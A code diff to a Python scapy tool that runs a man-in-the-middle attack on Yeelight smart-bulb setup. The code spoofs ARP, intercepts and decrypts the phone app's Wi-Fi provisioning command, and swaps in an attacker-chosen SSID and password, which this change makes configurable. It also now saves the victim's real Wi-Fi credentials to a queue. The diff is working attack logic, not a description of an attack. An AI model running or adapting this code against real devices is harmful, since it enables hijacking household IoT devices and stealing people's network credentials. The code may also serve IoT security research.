@@ -1,6 +1,7 @@
 from threading import *
 from scapy.all import *
 from binascii import unhexlify
+from queue import Queue
 import time
 import json
 
@@ -8,7 +9,7 @@ from .yeelight_message import YeelightMessage
 from .message_decryption import decrypt, encrypt, get_md5
 
 class YeelightSocket():
-    def __init__(self, ap_iface, attack_iface, ip, mac):
+    def __init__(self, ap_iface, attack_iface, ip, mac, malicious_ap_ssid, malicious_ap_password):
         self.event = Event()
 
         self.malicious_yeelight_iface = ap_iface
@@ -24,10 +25,12 @@ class YeelightSocket():
         self.yeelight_mac = mac
         self.yeelight_port = 54321
 
-        self.rtt = 0
-        self.connection_established = False
+        self.malicious_ap_ssid = malicious_ap_ssid
+        self.malicious_ap_password = malicious_ap_password
 
-        self.start_connection_proccess()
+        self.rtt = 0
+        self.wifi_connection_command = None
+        self.connection_established = False
 
     def listen_to_phone(self):
         pkt = sniff(count=1, iface=self.malicious_yeelight_iface, filter=f"udp and (dst port {self.yeelight_port})")
@@ -67,8 +70,8 @@ class YeelightSocket():
             elif self.rtt == 2:
                 self.phone_message_wifi = YeelightMessage()
                 self.create_from_hexstream(self.phone_message_wifi, phone_pkt[0][Raw].load, False)
-                wifi_connection_command = decrypt(self.phone_message_wifi.data, self.yeelight_message_token.md5_checksum)
-                print("Recieved: " + str(wifi_connection_command))
+                self.wifi_connection_command = decrypt(self.phone_message_wifi.data, self.yeelight_message_token.md5_checksum)
+                print("Recieved: " + str(self.wifi_connection_command))
                 
                 self.malicious_phone_message_wifi = YeelightMessage()
                 self.malicious_phone_message_wifi.magic_number = self.phone_message_wifi.magic_number
@@ -77,7 +80,7 @@ class YeelightSocket():
                 self.malicious_phone_message_wifi.device_id = self.phone_message_wifi.device_id
                 self.malicious_phone_message_wifi.stamp = self.phone_message_wifi.stamp
                 self.malicious_phone_message_wifi.md5_checksum = self.yeelight_message_token.md5_checksum
-                self.malicious_phone_message_wifi.data = str(encrypt(self.malicious_data(wifi_connection_command.decode()), self.yeelight_message_token.md5_checksum).hex())
+                self.malicious_phone_message_wifi.data = str(encrypt(self.malicious_data(self.wifi_connection_command.decode()), self.yeelight_message_token.md5_checksum).hex())
                 print("Sent: " + str(decrypt(self.malicious_phone_message_wifi.data, self.yeelight_message_token.md5_checksum)))
                 packet_lenght = format(int(len(self.malicious_phone_message_wifi.message)/2) & 0xffff, "04X")
                 self.malicious_phone_message_wifi.packet_length = packet_lenght
@@ -113,9 +116,14 @@ class YeelightSocket():
                 pkt_from_yeelight_forward = self.pkt_to_phone(yeelight_pkt[0])
                 sendp(pkt_from_yeelight_forward, iface=self.malicious_yeelight_iface, verbose=False)
                 self.connection_established = True
+
+                # Last message
+                self.queue.put(self.wifi_connection_command)
+
             self.rtt += 1
     
-    def start_connection_proccess(self):
+    def start_socket(self, queue):
+        self.queue = queue
         thread_yeelight_arp_response = Thread(target=self.yeelight_arp_response)
         thread_phone_socket = Thread(target=self.phone_socket)
         thread_yeelight_socket = Thread(target=self.yeelight_socket)
@@ -145,8 +153,8 @@ class YeelightSocket():
             "id":int(time.time()) , 
             "method":real_command["method"],
             "params":{
-                "ssid":"Malicious_AP",
-                "passwd":"maliciousap123",
+                "ssid":self.malicious_ap_ssid,
+                "passwd":self.malicious_ap_password,
                 "uid":real_command["params"]["uid"],
                 "country_domain":real_command["params"]["country_domain"],
                 "tz":real_command["params"]["tz"],
